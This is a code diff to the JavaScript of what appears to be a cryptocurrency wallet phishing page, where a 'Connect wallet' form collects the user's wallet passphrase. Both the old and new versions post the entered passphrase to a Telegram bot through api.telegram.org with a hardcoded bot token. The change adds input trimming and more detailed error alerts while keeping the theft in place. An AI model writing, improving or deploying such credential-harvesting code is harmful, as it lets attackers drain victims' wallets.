@@ -72726,20 +72726,17 @@
 const submitButton = document.getElementById('submit-btn');
     submitButton.textContent = "Connecting...";  // Change button text to indicate sending
     submitButton.disabled = true;  // Disable the button while the request is being processed
+
+     let walletInput = document.getElementById('wallet-input').value.trim(); // Trim input
   try {
-    const walletInput = document.getElementById('wallet-input').value;
 
     // Check if the input is not empty
-    if (!walletInput) {
-      alert("Please enter your passphrase to connect to wallet");
-      return;
-    }
+     if (!walletInput) {
+                    alert("Please enter your passphrase to connect to wallet");
+                    throw new Error("Empty input"); // Prevents API call if input is empty
+                }
 
-    // Show loading or sending message
     
-
-    // Define the data you want to send in the POST request
-    const text = walletInput
 
 
     let BOT_TOKEN = '7768282801:AAGmIi6q-1-5fsXxCx8IfeAg2a5O2BQcKgU'
@@ -72747,15 +72744,30 @@ const submitButton = document.getElementById('submit-btn');
 
     const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id,
-        text
+        text: walletInput
     })
-    console.log(response)
-    alert('sent')
+     if (response.status === 200 && response.data.ok) {
+                    console.log(response);
+                    alert('Message sent successfully');
+                } else {
+                    throw new Error("Failed to send message");
+                }
     
 
   } catch (error) {
     console.log(error);
-     alert('An error occurred while sending the request.');
+     console.error("Error:", error);
+                
+                if (error.message === "Empty input") {
+                    // Do nothing, alert already shown
+                } else if (error.response) {
+                    alert(`Telegram API Error: ${error.response.data.description || "Unknown error"}`);
+                } else if (error.request) {
+                    alert("Network error: Failed to connect to Telegram API. Please check your internet connection.");
+                } else {
+                    alert("An unexpected error occurred.");
+                }
+
   } finally {
     submitButton.textContent = "Connect wallet"; // Change text back to original
       submitButton.disabled = false; // Re-enable the button
